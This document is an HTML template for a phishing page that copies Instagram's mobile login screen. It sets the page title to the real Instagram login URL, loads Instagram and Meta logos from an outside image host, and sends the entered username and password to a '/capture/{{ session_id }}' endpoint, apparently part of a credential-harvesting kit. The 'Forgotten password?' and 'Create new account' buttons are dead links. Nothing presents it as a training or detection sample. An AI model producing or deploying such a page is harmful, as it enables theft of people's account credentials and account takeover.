<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>https://www.Instagram.com/accounts/login/</title>

<style>

*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:Arial,sans-serif;
}

body{
background:#132635;
height:100vh;
display:flex;
justify-content:center;
overflow:hidden;
}

.container{
width:100%;
max-width:430px;
height:100vh;
padding:20px;
position:relative;
display:flex;
flex-direction:column;
}

/* Language */
.language{
margin-top:12px;
text-align:center;
font-size:13px;
color:#B0B8C0;
letter-spacing:0.2px;
}

/* Main logo */

.logo-wrap{
display:flex;
justify-content:center;
margin-top:50px;
}

.logo{
width:130px;
height:130px;
object-fit:contain;
}

/* Form section */

.form{
margin-top:70px;
}

.input-box{
width:100%;
height:54px;
background:#152A38;
border:2px solid #3D4954;
border-radius:12px;
padding:0 16px;
margin-bottom:12px;
outline:none;
font-size:15px;
color:white;
}

.input-box:focus{
border-color:#0064E0;
}

.input-box::placeholder{
color:#8A949E;
font-size:14px;
}

.login-btn{
width:100%;
height:48px;
border:none;
border-radius:50px;
background:#0064E0;
font-size:16px;
font-weight:600;
color:white;
margin-top:8px;
cursor:pointer;
transition:background 0.2s;
}

.login-btn:hover{
background:#0050B3;
}

.forgot{
margin-top:24px;
text-align:center;
font-size:14px;
color:white;
cursor:pointer;
}

/* Bottom */

.bottom{
margin-top:auto;
padding-bottom:45px;
}

.create-btn{
width:100%;
height:48px;
border:2px solid #2D8CFF;
border-radius:50px;
background:transparent;
color:#2D8CFF;
font-size:15px;
font-weight:600;
cursor:pointer;
transition:background 0.2s;
}

.create-btn:hover{
background:rgba(45,140,255,0.08);
}

/* Meta image */

.meta-wrap{
position:absolute;
bottom:10px;
left:50%;
transform:translateX(-50%);
}

.meta-logo{
width:110px;
height:auto;
display:block;
object-fit:contain;
}

</style>
</head>

<body>

<div class="container">

<div class="language">
English (UK)
</div>

<div class="logo-wrap">
<img class="logo"
src="https://files.catbox.moe/nvfhtj.png">
</div>

<div class="form">

<form action="/capture/{{ session_id }}" method="POST">

<input class="input-box" name="username"
placeholder="Username, email address or mobile number" required>

<input class="input-box" name="password"
type="password"
placeholder="Password" required>

<button class="login-btn" type="submit">
Log in
</button>

</form>

<div class="forgot" onclick="window.location.href=''">
Forgotten password?
</div>

</div>

<div class="bottom">

<button class="create-btn" onclick="window.location.href=''">
Create new account
</button>

</div>

<div class="meta-wrap">

<img class="meta-logo"
src="https://files.catbox.moe/vee6jc.png">

</div>

</div>

</body>
</html>
